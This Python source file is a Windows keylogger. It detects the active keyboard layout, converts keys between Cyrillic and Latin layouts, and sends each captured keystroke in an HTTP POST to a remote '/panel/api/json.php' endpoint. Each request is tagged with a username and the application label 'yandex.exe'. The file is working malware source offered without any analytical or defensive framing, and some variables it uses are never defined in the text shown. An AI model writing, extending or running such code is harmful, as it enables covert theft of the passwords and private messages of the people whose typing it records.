import ctypes
import json
import requests

language_codes = {
    '0x409': 'English - United States',
    '0x809': 'English - United Kingdom',
    '0x419': 'Russian',
}
latin_into_cyrillic = (
                        "`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
                        "qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
                        "~`{[}]:;\"'|<,>.?/@#$^&",

                        "ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
                        "йцукенгшщзхъфывапролджэячсмитьбю." +
                        "ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?"
                    )
cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])
latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])
cyrillic_layouts = ['Russian', 'Belarusian', 'Kazakh', 'Ukrainian']




def detect_keyboard_layout_win():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x419'] # Russian
    return language
def cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language):
    if ord(key_pressed) in cyrillic_into_latin_trantab:
        key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])
    elif current_keyboard_language in cyrillic_layouts and initial_keyboard_language not in cyrillic_layouts:
        if ord(key_pressed) in latin_into_cyrillic_trantab:
            key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])
    return key_pressed
def create_keypress_callback(username):
    def keypress_callback(event):
        application = "yandex.exe"
        key_pressed = event.name
        current_keyboard_language = detect_keyboard_layout_win()
        if len(key_pressed) == 1:
            if 'English' in current_keyboard_language and 'English' not in initial_keyboard_language:
                key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)
            if 'Russian' in current_keyboard_language and 'Russian' not in initial_keyboard_language:
                key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)
        
        payload = {"keyboardData" : key_pressed}

        
        r = requests.post(f"http://{servername}/panel/api/json.php", json=payload, headers={"Content-Type" : "application/json", "X-USERNAME": username, "X-APPLICATION": application}) 
    
    return keypress_callback
